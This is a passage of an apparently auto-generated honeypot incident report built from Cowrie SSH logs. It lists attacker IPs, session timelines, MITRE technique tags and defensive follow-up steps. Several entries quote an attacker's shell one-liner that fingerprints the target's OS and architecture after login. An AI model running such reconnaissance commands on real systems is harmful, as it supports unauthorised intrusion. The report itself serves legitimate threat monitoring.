| `2026-08-11 00:43:17` | `cowrie.command.input` |
| `2026-08-11 00:43:17` | `cowrie.command.input` |
| `2026-08-11 00:43:17` | `cowrie.command.input` |
| `2026-08-11 00:43:17` | `cowrie.log.closed` |
| `2026-08-11 00:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae31a3192809

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 00:45 |
| **Last Seen** | 2026-08-11 00:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:45:43` | `cowrie.session.connect` |
| `2026-08-11 00:45:44` | `cowrie.client.version` |
| `2026-08-11 00:45:44` | `cowrie.client.kex` |
| `2026-08-11 00:45:46` | `cowrie.login.success` |
| `2026-08-11 00:45:48` | `cowrie.session.params` |
| `2026-08-11 00:45:48` | `cowrie.command.input` |
| `2026-08-11 00:45:48` | `cowrie.command.input` |
| `2026-08-11 00:45:48` | `cowrie.command.input` |
| `2026-08-11 00:45:48` | `cowrie.command.input` |
| `2026-08-11 00:45:48` | `cowrie.command.input` |
| `2026-08-11 00:45:48` | `cowrie.command.success` |
| `2026-08-11 00:45:48` | `cowrie.command.input` |
| `2026-08-11 00:45:48` | `cowrie.command.input` |
| `2026-08-11 00:45:48` | `cowrie.command.input` |
| `2026-08-11 00:45:48` | `cowrie.command.input` |
| `2026-08-11 00:45:48` | `cowrie.log.closed` |
| `2026-08-11 00:45:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8430bfe3c3b7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 00:49 |
| **Last Seen** | 2026-08-11 00:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:49:53` | `cowrie.session.connect` |
| `2026-08-11 00:49:53` | `cowrie.client.version` |
| `2026-08-11 00:49:53` | `cowrie.client.kex` |
| `2026-08-11 00:49:53` | `cowrie.login.success` |
| `2026-08-11 00:49:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e09ee5dc1bfb

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 00:49 |
| **Last Seen** | 2026-08-11 00:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:49:54` | `cowrie.session.connect` |
| `2026-08-11 00:49:54` | `cowrie.client.version` |
| `2026-08-11 00:49:54` | `cowrie.client.kex` |
| `2026-08-11 00:49:54` | `cowrie.login.success` |
| `2026-08-11 00:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ff045a4ab0a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 00:50 |
| **Last Seen** | 2026-08-11 00:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:50:02` | `cowrie.session.connect` |
| `2026-08-11 00:50:02` | `cowrie.client.version` |
| `2026-08-11 00:50:02` | `cowrie.client.kex` |
| `2026-08-11 00:50:02` | `cowrie.login.success` |
| `2026-08-11 00:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32e8a121515c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 00:50 |
| **Last Seen** | 2026-08-11 00:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:50:02` | `cowrie.session.connect` |
| `2026-08-11 00:50:02` | `cowrie.client.version` |
| `2026-08-11 00:50:02` | `cowrie.client.kex` |
| `2026-08-11 00:50:02` | `cowrie.login.success` |
| `2026-08-11 00:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d79a47b6f0f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 00:50 |
| **Last Seen** | 2026-08-11 00:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:50:08` | `cowrie.session.connect` |
| `2026-08-11 00:50:08` | `cowrie.client.version` |
| `2026-08-11 00:50:08` | `cowrie.client.kex` |
| `2026-08-11 00:50:11` | `cowrie.login.success` |
| `2026-08-11 00:50:13` | `cowrie.session.params` |
| `2026-08-11 00:50:13` | `cowrie.command.input` |
| `2026-08-11 00:50:13` | `cowrie.command.input` |
| `2026-08-11 00:50:13` | `cowrie.command.input` |
| `2026-08-11 00:50:13` | `cowrie.command.input` |
| `2026-08-11 00:50:13` | `cowrie.command.input` |
| `2026-08-11 00:50:13` | `cowrie.command.success` |
| `2026-08-11 00:50:13` | `cowrie.command.input` |
| `2026-08-11 00:50:13` | `cowrie.command.input` |
| `2026-08-11 00:50:13` | `cowrie.command.input` |
| `2026-08-11 00:50:13` | `cowrie.command.input` |
| `2026-08-11 00:50:14` | `cowrie.log.closed` |
| `2026-08-11 00:50:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5daba228847f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 00:52 |
| **Last Seen** | 2026-08-11 00:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:52:18` | `cowrie.session.connect` |
| `2026-08-11 00:52:19` | `cowrie.client.version` |
| `2026-08-11 00:52:19` | `cowrie.client.kex` |
| `2026-08-11 00:52:23` | `cowrie.login.success` |
| `2026-08-11 00:52:26` | `cowrie.session.params` |
| `2026-08-11 00:52:26` | `cowrie.command.input` |
| `2026-08-11 00:52:26` | `cowrie.command.input` |
| `2026-08-11 00:52:26` | `cowrie.command.input` |
| `2026-08-11 00:52:26` | `cowrie.command.input` |
| `2026-08-11 00:52:26` | `cowrie.command.input` |
| `2026-08-11 00:52:26` | `cowrie.command.success` |
| `2026-08-11 00:52:26` | `cowrie.command.input` |
| `2026-08-11 00:52:26` | `cowrie.command.input` |
| `2026-08-11 00:52:26` | `cowrie.command.input` |
| `2026-08-11 00:52:26` | `cowrie.command.input` |
| `2026-08-11 00:52:27` | `cowrie.log.closed` |
| `2026-08-11 00:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-195bd33ca099

| Field | Detail |
|---|---|
| **Source IP** | `60.223.250[.]50` |
| **First Seen** | 2026-08-11 00:53 |
| **Last Seen** | 2026-08-11 00:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:53:09` | `cowrie.session.connect` |
| `2026-08-11 00:53:10` | `cowrie.client.version` |
| `2026-08-11 00:53:10` | `cowrie.client.kex` |
| `2026-08-11 00:53:11` | `cowrie.login.success` |
| `2026-08-11 00:53:12` | `cowrie.direct-tcpip.request` |
| `2026-08-11 00:53:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.250[.]50` to AbuseIPDB if not already reported
- [ ] Block `60.223.250[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cd94dc4f54c

| Field | Detail |
|---|---|
| **Source IP** | `65.20.133[.]56` |
| **First Seen** | 2026-08-11 00:53 |
| **Last Seen** | 2026-08-11 00:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:53:17` | `cowrie.session.connect` |
| `2026-08-11 00:53:17` | `cowrie.client.version` |
| `2026-08-11 00:53:17` | `cowrie.client.kex` |
| `2026-08-11 00:53:18` | `cowrie.login.success` |
| `2026-08-11 00:53:19` | `cowrie.direct-tcpip.request` |
| `2026-08-11 00:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.133[.]56` to AbuseIPDB if not already reported
- [ ] Block `65.20.133[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0f35691dc88

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 00:54 |
| **Last Seen** | 2026-08-11 00:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:54:18` | `cowrie.session.connect` |
| `2026-08-11 00:54:18` | `cowrie.client.version` |
| `2026-08-11 00:54:18` | `cowrie.client.kex` |
| `2026-08-11 00:54:20` | `cowrie.login.success` |
| `2026-08-11 00:54:21` | `cowrie.session.params` |
| `2026-08-11 00:54:21` | `cowrie.command.input` |
| `2026-08-11 00:54:21` | `cowrie.command.input` |
| `2026-08-11 00:54:21` | `cowrie.command.input` |
| `2026-08-11 00:54:21` | `cowrie.command.input` |
| `2026-08-11 00:54:21` | `cowrie.command.input` |
| `2026-08-11 00:54:21` | `cowrie.command.success` |
| `2026-08-11 00:54:21` | `cowrie.command.input` |
| `2026-08-11 00:54:21` | `cowrie.command.input` |
| `2026-08-11 00:54:21` | `cowrie.command.input` |
| `2026-08-11 00:54:21` | `cowrie.command.input` |
| `2026-08-11 00:54:22` | `cowrie.log.closed` |
| `2026-08-11 00:54:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee1b6a304e9e

| Field | Detail |
|---|---|
| **Source IP** | `49.124.133[.]102` |
| **First Seen** | 2026-08-11 00:58 |
| **Last Seen** | 2026-08-11 00:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 00:58:21` | `cowrie.session.connect` |
| `2026-08-11 00:58:22` | `cowrie.client.version` |
| `2026-08-11 00:58:22` | `cowrie.client.kex` |
| `2026-08-11 00:58:24` | `cowrie.login.success` |
| `2026-08-11 00:58:25` | `cowrie.direct-tcpip.request` |
| `2026-08-11 00:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.133[.]102` to AbuseIPDB if not already reported
- [ ] Block `49.124.133[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c841380c3a92

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 01:00 |
| **Last Seen** | 2026-08-11 01:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:00:43` | `cowrie.session.connect` |
| `2026-08-11 01:00:43` | `cowrie.client.version` |
| `2026-08-11 01:00:43` | `cowrie.client.kex` |
| `2026-08-11 01:00:44` | `cowrie.login.success` |
| `2026-08-11 01:00:45` | `cowrie.session.params` |
| `2026-08-11 01:00:45` | `cowrie.command.input` |
| `2026-08-11 01:00:45` | `cowrie.command.input` |
| `2026-08-11 01:00:45` | `cowrie.command.input` |
| `2026-08-11 01:00:45` | `cowrie.command.input` |
| `2026-08-11 01:00:45` | `cowrie.command.input` |
| `2026-08-11 01:00:45` | `cowrie.command.success` |
| `2026-08-11 01:00:45` | `cowrie.command.input` |
| `2026-08-11 01:00:45` | `cowrie.command.input` |
| `2026-08-11 01:00:45` | `cowrie.command.input` |
| `2026-08-11 01:00:45` | `cowrie.command.input` |
| `2026-08-11 01:00:45` | `cowrie.log.closed` |
| `2026-08-11 01:00:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54923c4b2063

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 01:03 |
| **Last Seen** | 2026-08-11 01:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:03:14` | `cowrie.session.connect` |
| `2026-08-11 01:03:14` | `cowrie.client.version` |
| `2026-08-11 01:03:14` | `cowrie.client.kex` |
| `2026-08-11 01:03:15` | `cowrie.login.success` |
| `2026-08-11 01:03:17` | `cowrie.session.params` |
| `2026-08-11 01:03:17` | `cowrie.command.input` |
| `2026-08-11 01:03:17` | `cowrie.command.input` |
| `2026-08-11 01:03:17` | `cowrie.command.input` |
| `2026-08-11 01:03:17` | `cowrie.command.input` |
| `2026-08-11 01:03:17` | `cowrie.command.input` |
| `2026-08-11 01:03:17` | `cowrie.command.success` |
| `2026-08-11 01:03:17` | `cowrie.command.input` |
| `2026-08-11 01:03:17` | `cowrie.command.input` |
| `2026-08-11 01:03:17` | `cowrie.command.input` |
| `2026-08-11 01:03:17` | `cowrie.command.input` |
| `2026-08-11 01:03:17` | `cowrie.log.closed` |
| `2026-08-11 01:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed3328ebe13d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 01:06 |
| **Last Seen** | 2026-08-11 01:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:06:13` | `cowrie.session.connect` |
| `2026-08-11 01:06:13` | `cowrie.client.version` |
| `2026-08-11 01:06:13` | `cowrie.client.kex` |
| `2026-08-11 01:06:14` | `cowrie.login.success` |
| `2026-08-11 01:06:15` | `cowrie.session.params` |
| `2026-08-11 01:06:15` | `cowrie.command.input` |
| `2026-08-11 01:06:15` | `cowrie.command.input` |
| `2026-08-11 01:06:15` | `cowrie.command.input` |
| `2026-08-11 01:06:15` | `cowrie.command.input` |
| `2026-08-11 01:06:15` | `cowrie.command.input` |
| `2026-08-11 01:06:15` | `cowrie.command.success` |
| `2026-08-11 01:06:15` | `cowrie.command.input` |
| `2026-08-11 01:06:15` | `cowrie.command.input` |
| `2026-08-11 01:06:15` | `cowrie.command.input` |
| `2026-08-11 01:06:15` | `cowrie.command.input` |
| `2026-08-11 01:06:15` | `cowrie.log.closed` |
| `2026-08-11 01:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a39cbfab6d2b

| Field | Detail |
|---|---|
| **Source IP** | `121.178.185[.]141` |
| **First Seen** | 2026-08-11 01:08 |
| **Last Seen** | 2026-08-11 01:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:08:59` | `cowrie.session.connect` |
| `2026-08-11 01:09:00` | `cowrie.client.version` |
| `2026-08-11 01:09:00` | `cowrie.client.kex` |
| `2026-08-11 01:09:03` | `cowrie.login.success` |
| `2026-08-11 01:09:04` | `cowrie.direct-tcpip.request` |
| `2026-08-11 01:09:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.178.185[.]141` to AbuseIPDB if not already reported
- [ ] Block `121.178.185[.]141` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ea1e2179376

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-11 01:10 |
| **Last Seen** | 2026-08-11 01:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:10:55` | `cowrie.session.connect` |
| `2026-08-11 01:10:55` | `cowrie.client.version` |
| `2026-08-11 01:10:55` | `cowrie.client.kex` |
| `2026-08-11 01:10:57` | `cowrie.login.success` |
| `2026-08-11 01:10:59` | `cowrie.session.params` |
| `2026-08-11 01:10:59` | `cowrie.command.input` |
| `2026-08-11 01:10:59` | `cowrie.command.input` |
| `2026-08-11 01:10:59` | `cowrie.command.input` |
| `2026-08-11 01:10:59` | `cowrie.command.input` |
| `2026-08-11 01:10:59` | `cowrie.command.input` |
| `2026-08-11 01:10:59` | `cowrie.command.success` |
| `2026-08-11 01:10:59` | `cowrie.command.input` |
| `2026-08-11 01:10:59` | `cowrie.command.input` |
| `2026-08-11 01:10:59` | `cowrie.command.input` |
| `2026-08-11 01:10:59` | `cowrie.command.input` |
| `2026-08-11 01:11:00` | `cowrie.log.closed` |
| `2026-08-11 01:11:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdf087c75831

| Field | Detail |
|---|---|
| **Source IP** | `211.184.53[.]155` |
| **First Seen** | 2026-08-11 01:11 |
| **Last Seen** | 2026-08-11 01:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 01:11:06` | `cowrie.session.connect` |
| `2026-08-11 01:11:07` | `cowrie.client.version` |
| `2026-08-11 01:11:07` | `cowrie.client.kex` |
| `2026-08-11 01:11:09` | `cowrie.login.success` |
| `2026-08-11 01:11:10` | `cowrie.direct-tcpip.request` |
| `2026-08-11 01:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.184.53[.]155` to AbuseIPDB if not already reported
- [ ] Block `211.184.53[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5af06adf0402

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
